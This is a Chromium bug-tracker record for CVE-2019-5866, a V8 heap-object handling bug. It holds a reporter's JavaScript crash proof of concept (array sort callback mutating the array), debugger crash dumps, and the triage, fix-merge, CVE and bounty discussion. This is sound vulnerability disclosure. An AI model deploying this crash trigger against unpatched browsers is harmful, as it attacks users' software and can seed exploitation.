#  Incorrect heap object handling in v8

| Field | Value |
|-------|-------|
| **Issue ID** | [40095500](https://issues.chromium.org/issues/40095500) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2019-5866 |
| **Reporter** | vu...@gmail.com |
| **Assignee** | ul...@chromium.org |
| **Created** | 2019-06-25 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36

Steps to reproduce the problem:
I was reported this bug Mon, Apr 1, 2019.
https://bugs.chromium.org/p/chromium/issues/detail?id=947923

Now it also can crash v8(7.5.288.23) and chrome-stable(75.0.3770.100).

PoC
<script>
let xs = [];
for(let i = [];i<6000;++i)
{
	xs.push(i);
	i++;
}
xs.sort(()=>{
	xs.shift();
	for(let i = -1.1;i<300;++i)
	{
		xs.push(i);
	}
	xs.shift();
	new ArrayBuffer(507222809);
})
window.location.reload();
</script>

What is the expected behavior?

What went wrong?
the crash info 
11:071> g
(328c.3d10): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome_child!ChromeMain+0x6ace32:
00007ffc`b200e182 f6400818        test    byte ptr [rax+8],18h ds:00002655`38440008=??
6:087> kb
 # RetAddr           : Args to Child                                                           : Call Site
00 00007ffc`b2d98a5c : 0000008d`e93fd658 00007ffc`b2d97dbe 00000000`00000001 00007ffc`b1c4920c : chrome_child!ChromeMain+0x6ace32
01 00007ffc`b2d98bd1 : 00000000`1e3b9b19 00007827`d3e04000 0000d4cc`ea7b8800 00007ffc`b1dd7aae : chrome_child!ovly_debug_event+0xce6d8c
02 00007ffc`b2d97456 : 00000000`1e3b9b19 00007ffc`00000000 00000000`00000000 0000d4cc`ea7b884a : chrome_child!ovly_debug_event+0xce6f01
03 00007ffc`b2ce6136 : 00000226`8dc22f00 0000008d`e93fd600 0000008d`e93fd570 00007ffc`b2cec04a : chrome_child!ovly_debug_event+0xce5786
04 00007ffc`b202b767 : 00007ffc`b2cea3a0 0000395d`380538d1 0000395d`38043421 00007ffc`b33f83bd : chrome_child!ovly_debug_event+0xc34466
05 00007ffc`b33f83bd : 00000000`00000028 0000008d`e93fd640 00007ffc`b3367fda 0000395d`380538d1 : chrome_child!ChromeMain+0x6ca417
06 00000000`00000028 : 0000008d`e93fd640 00007ffc`b3367fda 0000395d`380538d1 0000395d`380538d1 : chrome_child!ovly_debug_event+0x13466ed
07 0000008d`e93fd640 : 00007ffc`b3367fda 0000395d`380538d1 0000395d`380538d1 00006ce4`20080139 : 0x28
08 00007ffc`b3367fda : 0000395d`380538d1 0000395d`380538d1 00006ce4`20080139 00000001`00000000 : 0x0000008d`e93fd640
09 0000395d`380538d1 : 0000395d`380538d1 00006ce4`20080139 00000001`00000000 0000008d`e93fd5e0 : chrome_child!ovly_debug_event+0x12b630a
0a 0000395d`380538d1 : 00006ce4`20080139 00000001`00000000 0000008d`e93fd5e0 00000000`00000028 : 0x0000395d`380538d1
0b 00006ce4`20080139 : 00000001`00000000 0000008d`e93fd5e0 00000000`00000028 0000008d`e93fd698 : 0x0000395d`380538d1
0c 00000001`00000000 : 0000008d`e93fd5e0 00000000`00000028 0000008d`e93fd698 000065b1`e280266f : 0x00006ce4`20080139
0d 0000008d`e93fd5e0 : 00000000`00000028 0000008d`e93fd698 000065b1`e280266f 00001369`8e7004d1 : 0x00000001`00000000
0e 00000000`00000028 : 0000008d`e93fd698 000065b1`e280266f 00001369`8e7004d1 0000395d`38057d81 : 0x0000008d`e93fd5e0
0f 0000008d`e93fd698 : 000065b1`e280266f 00001369`8e7004d1 0000395d`38057d81 00000005`00000000 : 0x28
10 000065b1`e280266f : 00001369`8e7004d1 0000395d`38057d81 00000005`00000000 00001369`8e7005b1 : 0x0000008d`e93fd698
11 00001369`8e7004d1 : 0000395d`38057d81 00000005`00000000 00001369`8e7005b1 00007ab6`c1dbf221 : 0x000065b1`e280266f
12 0000395d`38057d81 : 00000005`00000000 00001369`8e7005b1 00007ab6`c1dbf221 00000000`0008c45e : 0x00001369`8e7004d1
13 00000005`00000000 : 00001369`8e7005b1 00007ab6`c1dbf221 00000000`0008c45e 404cf333`33333333 : 0x0000395d`38057d81
14 00001369`8e7005b1 : 00007ab6`c1dbf221 00000000`0008c45e 404cf333`33333333 00002a01`e2900139 : 0x00000005`00000000
15 00007ab6`c1dbf221 : 00000000`0008c45e 404cf333`33333333 00002a01`e2900139 00007ab6`c1dbf221 : 0x00001369`8e7005b1
16 00000000`0008c45e : 404cf333`33333333 00002a01`e2900139 00007ab6`c1dbf221 00007ab6`c1db0439 : 0x00007ab6`c1dbf221
17 404cf333`33333333 : 00002a01`e2900139 00007ab6`c1dbf221 00007ab6`c1db0439 00007ab6`c1dbf261 : 0x8c45e
18 00002a01`e2900139 : 00007ab6`c1dbf221 00007ab6`c1db0439 00007ab6`c1dbf261 00007ab6`c1db0439 : 0x404cf333`33333333
19 00007ab6`c1dbf221 : 00007ab6`c1db0439 00007ab6`c1dbf261 00007ab6`c1db0439 0000008d`e93fd6d0 : 0x00002a01`e2900139
1a 00007ab6`c1db0439 : 00007ab6`c1dbf261 00007ab6`c1db0439 0000008d`e93fd6d0 00007ffc`b3365b3c : 0x00007ab6`c1dbf221
1b 00007ab6`c1dbf261 : 00007ab6`c1db0439 0000008d`e93fd6d0 00007ffc`b3365b3c 00007ab6`c1db4db1 : 0x00007ab6`c1db0439
1c 00007ab6`c1db0439 : 0000008d`e93fd6d0 00007ffc`b3365b3c 00007ab6`c1db4db1 00000000`00000000 : 0x00007ab6`c1dbf261
1d 0000008d`e93fd6d0 : 00007ffc`b3365b3c 00007ab6`c1db4db1 00000000`00000000 00000002`00000000 : 0x00007ab6`c1db0439
1e 00007ffc`b3365b3c : 00007ab6`c1db4db1 00000000`00000000 00000002`00000000 00007ab6`c1dbf261 : 0x0000008d`e93fd6d0
1f 00007ab6`c1db4db1 : 00000000`00000000 00000002`00000000 00007ab6`c1dbf261 00000000`00000024 : chrome_child!ovly_debug_event+0x12b3e6c
20 00000000`00000000 : 00000002`00000000 00007ab6`c1dbf261 00000000`00000024 0000008d`e93fd708 : 0x00007ab6`c1db4db1
6:087> r
rax=0000265538440000 rbx=0000000000024658 rcx=0000000000000000
rdx=0000000000024658 rsi=000000000008838d rdi=00006ce420080008
rip=00007ffcb200e182 rsp=0000008de93fd280 rbp=00006ce420080148
 r8=00000000004662c0  r9=0000000000000008 r10=00006ce420080150
r11=00006ce420080148 r12=000002268dc2bfa8 r13=000000000008cc58
r14=00006ce420080139 r15=0000000000000003
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome_child!ChromeMain+0x6ace32:
00007ffc`b200e182 f6400818        test    byte ptr [rax+8],18h ds:00002655`38440008=??

Did this work before? N/A 

Chrome version: 75.0.3770.100  Channel: stable
OS Version: 10.0
Flash Version:

## Timeline

### jd...@chromium.org (2019-06-25)

Assigning based on similarity to https://crbug.com/chromium/942699.

mlippautz@ if you're not the right person for this, can you help reassign as needed? Thanks!

### ml...@chromium.org (2019-06-25)

If this is the same issue, then it is concurrent marking related. Strack trace with symbols would be awesome.

I guess you used the repro from https://crbug.com/chromium/947923?

Ulan, can you have a look?

### ul...@chromium.org (2019-06-26)

I can reproduce the crash on M75. It seems to be fixed on M77. I'll bisect

0x0000559360f12cf1	(chrome -spaces.h:643 )	<name omitted>
0x0000559360f12c75	(chrome -heap.cc:1524 )	v8::internal::Heap::MoveElements(v8::internal::FixedArray, int, int, int, v8::internal::WriteBarrierMode)
0x0000559360ea10d8	(chrome -elements.cc:2458 )	v8::internal::(anonymous namespace)::FastElementsAccessor<v8::internal::(anonymous namespace)::FastPackedObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)2> >::RemoveElement(v8::internal::Handle<v8::internal::JSArray>, v8::internal::(anonymous namespace)::Where)
0x0000559360dfce83	(chrome -builtins-array.cc:588 )	v8::internal::Builtin_Impl_ArrayShift(v8::internal::BuiltinArguments, v8::internal::Isolate*)
0x000055935f71c3f8	(chrome + 0x01a5c3f8 )	Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit
0x000035a931f823f6		
0x000055935f68abfb	(chrome + 0x019cabfb )	Builtins_ArgumentsAdaptorTrampoline
0x000055935f75b4c8	(chrome + 0x01a9b4c8 )	Builtins_SortCompareUserFn
0x000055935f75e41b	(chrome + 0x01a9e41b )	Builtins_ArrayTimSort
0x000055935f75f901	(chrome + 0x01a9f901 )	Builtins_ArrayPrototypeSort
0x000055935f6915c3	(chrome + 0x019d15c3 )	Builtins_InterpreterEntryTrampoline
0x000055935f68ef3c	(chrome + 0x019cef3c )	Builtins_JSEntryTrampoline
0x000055935f68ecb7	(chrome + 0x019cecb7 )	Builtins_JSEntry
0x0000559360ebfa12	(chrome -simulator.h:138 )	v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&)
0x0000559360ebf814	(chrome -execution.cc:358 )	v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*)
0x0000559360d90bdc	(chrome -api.cc:2178 )	v8::Script::Run(v8::Local<v8::Context>)
0x0000559364690e38	(chrome -v8_script_runner.cc:329 )	blink::V8ScriptRunner::RunCompiledScript(v8::Isolate*, v8::Local<v8::Script>, blink::ExecutionContext*)
0x0000559364bfd650	(chrome -script_controller.cc:134 )	blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local<v8::Context>, blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&)
0x0000559364bfe108	(chrome -script_controller.cc:326 )	blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&, blink::ScriptController::ExecuteScriptPolicy)
0x0000559364bfe379	(chrome -script_controller.cc:290 )	blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::SanitizeScriptErrors, blink::ScriptFetchOptions const&)
0x000055936540ee66	(chrome -pending_script.cc:276 )	blink::PendingScript::ExecuteScriptBlock(blink::KURL const&)
0x0000559365410881	(chrome -script_loader.cc:835 )	blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport)
0x00005593653f8592	(chrome -html_parser_script_runner.cc:541 )	blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element*, WTF::TextPosition const&)
0x0000559364fc17d8	(chrome -html_document_parser.cc:294 )	blink::HTMLDocumentParser::RunScriptsForPausedTreeBuilder()
0x0000559364fc2ed1	(chrome -html_document_parser.cc:529 )	blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::__1::unique_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::__1::default_delete<blink::HTMLDocumentParser::TokenizedChunk> >)
0x0000559364fc1663	(chrome -html_document_parser.cc:587 )	blink::HTMLDocumentParser::PumpPendingSpeculations()
0x00005593615a883c	(chrome -callback.h:97 )	blink::TaskHandle::Runner::Run(blink::TaskHandle const&)
0x0000559361d99c0a	(chrome -callback.h:97 )	base::TaskAnnotator::RunTask(char const*, base::PendingTask*)
0x0000559361d9a7c5	(chrome -thread_controller_with_message_pump_impl.cc:363 )	base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*, bool*)
0x0000559361d9a5a4	(chrome -thread_controller_with_message_pump_impl.cc:214 )	base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork()
0x0000559361d59755	(chrome -message_pump_default.cc:39 )	base::MessagePumpDefault::Run(base::MessagePump::Delegate*)
0x0000559361d9aff4	(chrome -thread_controller_with_message_pump_impl.cc:448 )	base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)
0x0000559361d778de	(chrome -run_loop.cc:161 )	base::RunLoop::RunWithTimeout(base::TimeDelta)
0x000055936601e5b6	(chrome -renderer_main.cc:223 )	content::RendererMain(content::MainFunctionParams const&)
0x000055936194d192	(chrome -content_main_runner_impl.cc:513 )	content::ContentMainRunnerImpl::Run(bool)
0x000055936198362a	(chrome -main.cc:415 )	service_manager::Main(service_manager::MainParams const&)
0x000055936194b120	(chrome -content_main.cc:19 )	content::ContentMain(content::ContentMainParams const&)
0x000055935f91d522	(chrome -chrome_main.cc:103 )	ChromeMain

### sh...@chromium.org (2019-06-26)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### vu...@gmail.com (2019-06-26)

I report this same crash bug on M73 the first time(https://crbug.com/chromium/947923), And finally it marks as a duplicate bug. please have a deep look. Thanks

### jd...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### ul...@chromium.org (2019-07-01)

This was fixed by  https://chromiumdash.appspot.com/commit/5b6a3abd26008a7fa14a6a04242584cd3e42df56 in M76.

Does it make sense to merge the fix to M75?

### sr...@google.com (2019-07-01)

ulan@ how safe is this fix to be taken to M75 now? We are already 100% on stable now with M75,  and considering a re-spin week of July 15 ( targeting very critical fixes), Can this wait until M76?

### ul...@chromium.org (2019-07-01)

The patch applied without conflicts to M75: https://chromium-review.googlesource.com/c/v8/v8/+/1684077

Since it has M76 coverage it should be safe.

### vu...@gmail.com (2019-07-01)

Hello,Is this also a duplicate bug?Now

### sh...@chromium.org (2019-07-02)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ul...@chromium.org (2019-07-03)

vulbugs@ there is a similar bug linked from the CL. I am keeping them separate because the other bug has different visibility settings.

srinivassista@ gentle ping about the merge decision. Also adding hablich@.

### sh...@chromium.org (2019-07-03)

[Empty comment from Monorail migration]

### sr...@google.com (2019-07-03)

ulan@ i will review this early next week and will let you know if we can include this to M75, I see this issue is there since M73,  so wondering what is criticality to fix it in M75 and since M75 re-spin and M76 timelines are not too far apart, ( 2 weeks only). Pls chime in your thoughts on this

### ul...@chromium.org (2019-07-09)

I think it is critical because it is a security issue with a test that reproduces the crash. At the time of M73 we didn't have such a test.

I am also okay with not merging considering the short time window of two weeks.

### sr...@google.com (2019-07-09)

awhalley@ can you also pls chime in your thoughts on this.

### aw...@google.com (2019-07-09)

I think we should take this in 75, it’s had almost a month of beta coverage.

(Note that while for many bug types “we’ve lived with it for several releases, so we can live with it for another” is sound reasoning, it’s much less so for security bugs which are more useful to attackers the more ubiquitous and longer lived they are)

### sr...@google.com (2019-07-09)

ulan@ pls go head and merge to M75. branch:3770. 

### ul...@chromium.org (2019-07-09)

Thanks, merged the CL to V8 branch 7.5 which corresponds to M75:
https://chromium-review.googlesource.com/c/v8/v8/+/1693010

### sr...@google.com (2019-07-10)

removing the approved label as the merge is completed.

### vu...@gmail.com (2019-07-11)

[Comment Deleted]

### vu...@gmail.com (2019-07-11)

Now，https://bugs.chromium.org/p/chromium/issues/detail?id=947923#c7 is allpublic,But the PoC is identical...

### vu...@gmail.com (2019-07-15)

Does this bug have a Bounty or CVE ?

### ul...@chromium.org (2019-07-15)

Adding awhalley@, natashapabrai@ for the question about a bounty in https://crbug.com/chromium/978382#c23.

Background for this issue:
1. vulbugs@ reported crbug.com/947923 and it was marked as duplicate of crbug.com/942699.
2. crbug.com/942699 was fixed on M75 and the fix was merged back to M74.
3. Independently I fixed crbug.com/918485 by simplifying the code and making it robust against race conditions in M76.
4. vulbugs@ observed that the crash reported in crbug.com/947923 still reproduces in M75 and filed this issue.
5. I found that my fix in M76 also fixes this issue.
6. I merged back the fix to M75.

Without vulbugs@ we would not notice that M75 still has the bug and would not merge the fix back.

I plan to add a variant of vulbugs@ POC as a regression test once M75 with the fix is release to all users.

### na...@google.com (2019-07-15)

[Empty comment from Monorail migration]

### ad...@google.com (2019-07-25)

[Empty comment from Monorail migration]

### vu...@gmail.com (2019-07-31)

awhalley@, natashapabrai@,u...@
The stable channel chrome has been updated to 75.0.3770.142 , 76.0.3809.87.
But I did not see any infomation about this case.

### aw...@google.com (2019-07-31)

+adetaylor@ for https://crbug.com/chromium/978382#c27

### ad...@google.com (2019-07-31)

Hi vulbugs@, sorry about that. We're switching to a new process of compiling our release notes and this sort of bug is one of the reasons - our old process didn't correctly spot it when it was released. It was released in 75.0.3770.142 and I will update the release notes to ensure you're properly credited. I've just assigned CVE-2019-5866.

### ad...@google.com (2019-07-31)

vulbugs@, how would you like to be credited? I'm going to go with "vulbugs" for now but can change that if you let me know.

### vu...@gmail.com (2019-07-31)

Please use the acknowledgement information:

Zhiyi Zhang and Zhunki from Codesafe Team of Legendsec at Qi'anxin Group

### na...@google.com (2019-08-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-08-01)

Congrats! The Panel decided to reward you $500 for this report! 

### na...@google.com (2019-08-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### is...@google.com (2019-11-23)

This issue was migrated from crbug.com/chromium/978382?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095500)*
